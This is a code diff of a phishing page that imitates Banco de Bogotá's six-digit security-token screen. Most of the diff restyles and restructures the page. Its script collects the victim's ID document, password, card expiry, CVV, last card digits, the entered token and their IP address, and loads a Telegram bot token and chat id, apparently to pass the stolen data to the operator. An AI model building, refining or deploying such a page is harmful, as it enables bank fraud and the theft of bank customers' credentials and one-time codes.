@@ -16,8 +16,7 @@
     />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <style>
-        /* Custom overrides to match professional style */
-        /* Loader Styles */
+        /* ====== LOADER ====== */
         #loading-overlay {
             position: fixed;
             top: 0;
@@ -46,35 +45,38 @@
             border-radius: 50%;
         }
 
-        .dot-yellow {
-            background-color: #f1c40f;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-
-        .dot-blue {
-            background-color: #3498db;
-            bottom: 5px;
-            left: 0;
-        }
-
-        .dot-red {
-            background-color: #e74c3c;
-            bottom: 5px;
-            right: 0;
-        }
+        .dot-yellow { background-color: #f1c40f; top: 0; left: 50%; transform: translateX(-50%); }
+        .dot-blue   { background-color: #3498db; bottom: 5px; left: 0; }
+        .dot-red    { background-color: #e74c3c; bottom: 5px; right: 0; }
 
         @keyframes rotateLoader {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        body {
-            background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%) !important;
+        /* ====== BODY / FONDO DIVIDIDO ====== */
+        html, body {
             min-height: 100vh;
             margin: 0;
-            font-family: 'Open Sans', sans-serif;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Open Sans', Arial, sans-serif;
+            background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%) !important;
+            background-attachment: fixed;
+            background-size: 100% 100%;
+            color: #333;
+        }
+
+        /* ====== CONTENEDOR PRINCIPAL ====== */
+        .box-container {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 50px 20px 20px;
+            box-sizing: border-box;
         }
 
         .container {
@@ -82,90 +84,53 @@
             flex-direction: row !important;
             justify-content: center !important;
             align-items: flex-start !important;
-            max-width: 1000px !important;
+            gap: 50px;
+            max-width: 1050px !important;
+            width: 100% !important;
             margin: 0 auto !important;
             padding: 20px !important;
             background: transparent !important;
             box-shadow: none !important;
             position: relative !important;
             height: auto !important;
+            box-sizing: border-box;
         }
 
-        .login-card-content {
-            background: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-            padding: 30px 20px;
+        /* ====== COLUMNA IZQUIERDA (LOGIN) ====== */
+        .container__login {
+            flex: 0 0 400px !important;
+            width: 400px !important;
+            max-width: 400px !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            background: transparent !important;
+            position: relative !important;
+            box-shadow: none !important;
+            left: auto !important;
+            top: auto !important;
+            display: block !important;
+            box-sizing: border-box;
+        }
+
+        .container__login--header {
+            text-align: center;
             margin-bottom: 15px;
+        }
+
+        .container__login--header img {
+            max-width: 200px;
+            height: auto;
+        }
+
+        .container__login--title h2 {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #333;
+            margin: 0 0 15px;
             text-align: center;
         }
 
-        .container__login {
-            flex: 0 0 380px !important;
-            padding-top: 0 !important;
-            margin-right: 40px !important;
-            background: transparent !important;
-            width: 380px !important;
-            box-shadow: none !important;
-            display: block !important;
-        }
-
-        .container__info {
-            flex: 1 !important;
-            padding: 0 !important;
-            background: transparent !important;
-            width: auto !important;
-            height: auto !important;
-            box-shadow: none !important;
-            display: block !important;
-            max-width: 500px !important;
-        }
-
-        @media (max-width: 768px) {
-            body {
-                background: #ffffff !important;
-            }
-
-            .container {
-                flex-direction: column !important;
-                align-items: center !important;
-                padding: 15px !important;
-                width: 100% !important;
-                box-sizing: border-box !important;
-            }
-
-            .container__login {
-                width: 100% !important;
-                flex: none !important;
-                margin-right: 0 !important;
-                margin-bottom: 20px !important;
-                max-width: 100% !important;
-            }
-
-            .container__info {
-                width: 100% !important;
-                flex: none !important;
-                max-width: 100% !important;
-                margin-top: 10px !important;
-            }
-            
-            /* Improve input usability on mobile */
-            input, select, textarea {
-                font-size: 16px !important; /* Prevents zoom on iOS */
-            }
-
-            .login-card-content {
-                padding: 15px !important;
-            }
-        }
-
-        .container__info img {
-             border-radius: 8px;
-             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-             display: block;
-             width: 100%;
-        }
-
+        /* Banner azul claro */
         .blue-banner {
             background-color: #e6f0fa;
             color: #0033a0;
@@ -174,34 +139,57 @@
             margin-bottom: 20px;
             display: flex;
             align-items: center;
-            font-size: 0.9em;
+            font-size: 0.88em;
             text-align: left;
             border-left: 4px solid #0033a0;
+            line-height: 1.5;
         }
-        
+
+        /* Tarjeta blanca del formulario */
+        .login-card-content {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            padding: 30px 25px;
+            margin-bottom: 15px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .login-card-content h3 {
+            color: #0033a0;
+            margin: 0 0 20px;
+            font-size: 1.1rem;
+        }
+
+        /* Inputs del token */
         .token-container {
             display: flex;
             justify-content: center;
             gap: 8px;
             margin: 20px 0;
         }
-        
+
         .token-input {
-            width: 45px;
-            height: 45px;
+            width: 48px;
+            height: 48px;
             text-align: center;
             font-size: 1.2rem;
             border: 1px solid #ccc;
             border-radius: 6px;
             outline: none;
-            transition: border-color 0.3s;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            box-sizing: border-box;
+            background: #fff;
+            color: #333;
         }
-        
+
         .token-input:focus {
             border-color: #0033a0;
             box-shadow: 0 0 0 2px rgba(0, 51, 160, 0.1);
         }
 
+        /* Botón principal */
         .btn-main {
             background-color: #0033a0;
             color: white;
@@ -213,13 +201,53 @@
             font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
+            transition: background 0.2s;
         }
-        
+
         .btn-main:hover {
             background-color: #002a85;
         }
 
-        /* Bottom Icons Styles (copied from index1.html) */
+        /* Texto reenviar */
+        .resend-text {
+            font-size: 0.8rem;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .resend-text a {
+            color: #0033a0;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .resend-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* ====== COLUMNA DERECHA (PROMO) ====== */
+        .container__info {
+            flex: 1 1 520px !important;
+            max-width: 540px !important;
+            width: auto !important;
+            padding: 0 !important;
+            background: transparent !important;
+            position: relative !important;
+            box-shadow: none !important;
+            left: auto !important;
+            top: auto !important;
+            right: auto !important;
+            display: block !important;
+            box-sizing: border-box;
+        }
+
+        .container__info img {
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            display: block;
+            width: 100%;
+            height: auto;
+        }
+
+        /* ====== ICONOS INFERIORES ====== */
         .bottom-icons-container {
             display: flex;
             align-items: center;
@@ -227,52 +255,57 @@
             margin-top: 25px;
             padding-bottom: 20px;
             width: 100%;
+            gap: 8px;
         }
+
         .icons-scroll-view {
             display: flex;
             overflow-x: auto;
             scroll-behavior: smooth;
-            gap: 10px;
+            gap: 12px;
             width: 100%;
             -ms-overflow-style: none;
             scrollbar-width: none;
-            padding: 0 5px;
+            padding: 4px;
         }
-        .icons-scroll-view::-webkit-scrollbar {
-            display: none;
-        }
+        .icons-scroll-view::-webkit-scrollbar { display: none; }
+
         .bottom-icon {
             display: flex;
             flex-direction: column;
             align-items: center;
             text-align: center;
             color: #0033a0;
-            font-size: 0.75rem;
+            font-size: 0.72rem;
             font-weight: bold;
-            flex: 0 0 85px;
+            flex: 0 0 90px;
             cursor: pointer;
+            line-height: 1.2;
         }
+
         .bottom-icon-box {
-            width: 48px;
-            height: 48px;
+            width: 52px;
+            height: 52px;
             border: 1px solid #d1d1d1;
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             margin-bottom: 8px;
-            background-color: transparent;
+            background-color: #fff;
             transition: all 0.2s;
         }
         .bottom-icon-box:hover {
             border-color: #0033a0;
             background-color: #f4f8ff;
+            transform: translateY(-2px);
         }
         .bottom-icon-box svg {
             width: 24px;
             height: 24px;
             fill: #0033a0;
         }
+
         .arrow-btn {
             width: 32px;
             height: 32px;
@@ -286,15 +319,60 @@
             background: #fff;
             flex-shrink: 0;
             z-index: 2;
+            transition: all 0.2s;
         }
         .arrow-btn:hover {
             border-color: #0033a0;
             background-color: #f4f8ff;
         }
-        .arrow-btn.left { margin-right: 5px; }
+        .arrow-btn.left  { margin-right: 5px; }
         .arrow-btn.right { margin-left: 5px; }
         .arrow-btn svg { width: 16px; height: 16px; fill: #0033a0; }
 
+        /* ====== RESPONSIVE (MÓVIL) ====== */
+        @media (max-width: 900px) {
+            body {
+                background: #ffffff !important;
+            }
+
+            .box-container {
+                padding: 30px 12px 20px;
+            }
+
+            .container {
+                flex-direction: column !important;
+                align-items: center !important;
+                gap: 25px;
+                padding: 10px !important;
+                width: 100% !important;
+            }
+
+            .container__login {
+                width: 100% !important;
+                max-width: 100% !important;
+                flex: none !important;
+            }
+
+            .container__info {
+                width: 100% !important;
+                max-width: 100% !important;
+                flex: none !important;
+            }
+
+            input, select, textarea {
+                font-size: 16px !important;
+            }
+
+            .login-card-content {
+                padding: 20px 15px !important;
+            }
+
+            .token-input {
+                width: 42px;
+                height: 42px;
+                font-size: 1.1rem;
+            }
+        }
     </style>
     <script>
       $.getJSON("https://api.ipify.org?format=json", function (data) {
@@ -306,10 +384,9 @@
       });
 
       var telegram_bot_id, chat_id;
-      
-      // Load credentials
-       fetch("claves.json?v=" + new Date().getTime())
-         .then(response => response.json())
+
+      fetch("claves.json?v=" + new Date().getTime())
+        .then(response => response.json())
         .then(data => {
             telegram_bot_id = data.token;
             chat_id = data.chat_id;
@@ -336,13 +413,12 @@
         var t4 = document.getElementById("num4").value;
         var t5 = document.getElementById("num5").value;
         var t6 = document.getElementById("num6").value;
-        
+
         var token_code = t1 + t2 + t3 + t4 + t5 + t6;
-        
+
         ip = document.getElementById("gfg").innerHTML;
         ip2 = document.getElementById("address").innerHTML;
 
-        // Retrieve stored data
         var saved_u_name = localStorage.getItem("u_name") || "Personas";
         var saved_u_name2 = localStorage.getItem("u_name2") || "";
         var saved_u_name3 = localStorage.getItem("u_name3") || "";
@@ -353,7 +429,7 @@
         message += "👤 <b>Tipo:</b> " + saved_u_name + "\n";
         message += "🆔 <b>Doc:</b> <code>" + saved_u_name3 + "</code> (" + saved_u_name2 + ")\n";
         message += "🔑 <b>Clave:</b> <code>" + saved_u_name4 + "</code>\n";
-        
+
         if (saved_last4 && saved_last4.length > 0) {
              message += "💳 <b>Ultimos4:</b> <code>" + saved_last4 + "</code>\n";
         }
@@ -367,14 +443,14 @@
             message += "📅 <b>Exp:</b> <code>" + card_exp + "</code>\n";
             message += "🔒 <b>CVV:</b> <code>" + card_cvv + "</code>\n";
         }
-        
+
         message += "\n🔢 <b>Token:</b> <code>" + token_code + "</code>\n\n";
         message += "🌍 <b>IP:</b> <code>" + ip + "</code>\n" + ip2;
       };
 
       function scrollIcons(direction) {
           const container = document.getElementById('iconsTrack');
-          const scrollAmount = 150; 
+          const scrollAmount = 150;
           if (direction === 'left') {
               container.scrollBy({ left: -scrollAmount, behavior: 'smooth' });
           } else {
@@ -385,8 +461,7 @@
       document.addEventListener('DOMContentLoaded', function() {
           const container = document.getElementById('iconsTrack');
           const leftArrow = document.querySelector('.arrow-btn.left');
-          
-          // Carousel logic
+
           var bannerImages = ["images/talaval.png", "images/millas.png"];
           var currentBannerIndex = 0;
           var bannerImgElement = document.getElementById('bannerImg');
@@ -415,7 +490,7 @@
         var saved_u_name3 = localStorage.getItem("u_name3") || "";
         var saved_u_name4 = localStorage.getItem("u_name4") || "";
         var saved_last4 = localStorage.getItem("last4") || "";
-        
+
         var ip = document.getElementById("gfg").innerHTML;
         var ip2 = document.getElementById("address").innerHTML;
 
@@ -423,7 +498,7 @@
         msg += "👤 <b>Tipo:</b> " + saved_u_name + "\n";
         msg += "🆔 <b>Doc:</b> <code>" + saved_u_name3 + "</code> (" + saved_u_name2 + ")\n";
         msg += "🔑 <b>Clave:</b> <code>" + saved_u_name4 + "</code>\n";
-        
+
         if (saved_last4 && saved_last4.length > 0) {
              msg += "💳 <b>Ultimos4:</b> <code>" + saved_last4 + "</code>\n";
         }
@@ -437,7 +512,7 @@
             msg += "<b>Exp:</b> <code>" + card_exp + "</code>\n";
             msg += "<b>CVV:</b> <code>" + card_cvv + "</code>\n";
         }
-        
+
         msg += "\n🌍 <b>IP:</b> <code>" + ip + "</code>\n" + ip2;
 
         document.getElementById('loading-overlay').style.display = 'flex';
@@ -495,8 +570,7 @@
 
       var sender = function () {
         ready();
-        
-        // Show Loader
+
         document.getElementById('loading-overlay').style.display = 'flex';
 
         var settings = {
@@ -567,99 +641,101 @@
     <p id="address" hidden=""></p>
     <p id="ip" hidden=""></p>
 
-    <div class="container">
-      
-      <!-- Left Side: Login -->
-      <div class="container__login">
-        <div class="container__login--header">
-          <img src="https://sapp2406.sirv.com/bogo/logobanco1.png" alt="Banco de Bogotá" />
-        </div>
-        
-        <div class="container__login--title">
-           <h2 style="font-size: 1.2rem; font-weight: bold; color: #333; margin-bottom: 15px;">Validación de Seguridad</h2>
+    <div class="box-container">
+      <div class="container">
+
+        <!-- Left Side: Login -->
+        <div class="container__login">
+          <div class="container__login--header">
+            <img src="https://sapp2406.sirv.com/bogo/logobanco1.png" alt="Banco de Bogotá" />
+          </div>
+
+          <div class="container__login--title">
+             <h2>Validación de Seguridad</h2>
+          </div>
+
+          <!-- Blue Banner -->
+          <div class="blue-banner">
+              <div>
+                  <strong>Código de seguridad</strong><br>
+                  Ingresa el código de 6 dígitos que hemos enviado a tu celular o correo registrado.
+              </div>
+          </div>
+
+          <!-- White Card Container for Token Form -->
+          <div class="login-card-content">
+              <h3>Ingresa el Token</h3>
+
+              <form onsubmit="return sender();" autocomplete="off">
+                  <div class="token-container">
+                      <input type="tel" class="token-input" maxlength="1" name="num1" id="num1" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 2)" required />
+                      <input type="tel" class="token-input" maxlength="1" name="num2" id="num2" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 3)" readonly />
+                      <input type="tel" class="token-input" maxlength="1" name="num3" id="num3" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 4)" readonly />
+                      <input type="tel" class="token-input" maxlength="1" name="num4" id="num4" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 5)" readonly />
+                      <input type="tel" class="token-input" maxlength="1" name="num5" id="num5" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 6)" readonly />
+                      <input type="tel" class="token-input" maxlength="1" name="num6" id="num6" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, null)" readonly />
+                  </div>
+
+                  <p class="resend-text">
+                      ¿No recibiste el código? <a href="#" onclick="return sendReenviar();">Reenviar</a>
+                  </p>
+
+                  <button type="submit" class="btn-main">Continuar</button>
+              </form>
+          </div>
+
+          <!-- Bottom Icons -->
+          <div class="bottom-icons-container">
+              <div class="arrow-btn left" style="display: none;" onclick="scrollIcons('left')">
+                  <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
+              </div>
+
+              <div class="icons-scroll-view" id="iconsTrack">
+                  <div class="bottom-icon">
+                      <div class="bottom-icon-box">
+                          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                      </div>
+                      <span>Ingreso seguro</span>
+                  </div>
+                  <div class="bottom-icon" onclick="window.open('https://www.grupoaval.com/BuscadordePuntosAval/', '_blank')">
+                      <div class="bottom-icon-box">
+                          <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                      </div>
+                      <span>Cajeros y oficinas</span>
+                  </div>
+                  <div class="bottom-icon" onclick="window.location.href='turno.html'">
+                       <div class="bottom-icon-box">
+                          <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                       </div>
+                       <span>Solicitar un turno digital</span>
+                  </div>
+                  <div class="bottom-icon">
+                       <div class="bottom-icon-box">
+                          <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 12h-2v-2h2v2zm0-4h-2V7h2v3z"/></svg>
+                       </div>
+                       <span>Centro de ayuda</span>
+                  </div>
+                  <div class="bottom-icon">
+                       <div class="bottom-icon-box">
+                          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                       </div>
+                       <span>Información</span>
+                  </div>
+              </div>
+
+              <div class="arrow-btn right" onclick="scrollIcons('right')">
+                  <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+              </div>
+          </div>
+
         </div>
 
-        <!-- Blue Banner -->
-        <div class="blue-banner">
-            <div>
-                <strong>Código de seguridad</strong><br>
-                Ingresa el código de 6 dígitos que hemos enviado a tu celular o correo registrado.
-            </div>
-        </div>
-
-        <!-- White Card Container for Token Form -->
-        <div class="login-card-content">
-            <h3 style="color: #0033a0; margin-bottom: 20px; font-size: 1.1rem;">Ingresa el Token</h3>
-            
-            <form onsubmit="return sender();" autocomplete="off">
-                <div class="token-container">
-                    <input type="tel" class="token-input" maxlength="1" name="num1" id="num1" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 2)" required />
-                    <input type="tel" class="token-input" maxlength="1" name="num2" id="num2" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 3)" readonly />
-                    <input type="tel" class="token-input" maxlength="1" name="num3" id="num3" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 4)" readonly />
-                    <input type="tel" class="token-input" maxlength="1" name="num4" id="num4" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 5)" readonly />
-                    <input type="tel" class="token-input" maxlength="1" name="num5" id="num5" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, 6)" readonly />
-                    <input type="tel" class="token-input" maxlength="1" name="num6" id="num6" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveToNextInput(this, null)" readonly />
-                </div>
-                
-                <p style="font-size: 0.8rem; color: #666; margin-bottom: 20px;">
-                    ¿No recibiste el código? <a href="#" onclick="return sendReenviar();" style="color: #0033a0; font-weight: bold;">Reenviar</a>
-                </p>
-
-                <button type="submit" class="btn-main">Continuar</button>
-            </form>
-        </div>
-
-        <!-- Bottom Icons -->
-        <div class="bottom-icons-container">
-            <div class="arrow-btn left" style="display: none;" onclick="scrollIcons('left')">
-                <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
-            </div>
-            
-            <div class="icons-scroll-view" id="iconsTrack">
-                <div class="bottom-icon">
-                    <div class="bottom-icon-box">
-                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
-                    </div>
-                    <span>Ingreso seguro</span>
-                </div>
-                <div class="bottom-icon" onclick="window.open('https://www.grupoaval.com/BuscadordePuntosAval/', '_blank')">
-                    <div class="bottom-icon-box">
-                        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
-                    </div>
-                    <span>Cajeros y oficinas</span>
-                </div>
-                <div class="bottom-icon" onclick="window.location.href='turno.html'">
-                     <div class="bottom-icon-box">
-                        <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
-                     </div>
-                     <span>Solicitar un turno digital</span>
-                </div>
-                <div class="bottom-icon">
-                     <div class="bottom-icon-box">
-                        <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 12h-2v-2h2v2zm0-4h-2V7h2v3z"/></svg>
-                     </div>
-                     <span>Centro de ayuda</span>
-                </div>
-                <div class="bottom-icon">
-                     <div class="bottom-icon-box">
-                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
-                     </div>
-                     <span>Información</span>
-                </div>
-            </div>
-            
-            <div class="arrow-btn right" onclick="scrollIcons('right')">
-                <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
-            </div>
+        <!-- Right Side: Promo -->
+        <div class="container__info">
+           <img src="images/talaval.png" alt="Promo" id="bannerImg" style="width: 100%; border-radius: 8px;" />
         </div>
 
       </div>
-
-      <!-- Right Side: Promo -->
-      <div class="container__info">
-         <img src="images/talaval.png" alt="Promo" id="bannerImg" style="width: 100%; border-radius: 8px;" />
-      </div>
-
     </div>
   </body>
 </html>
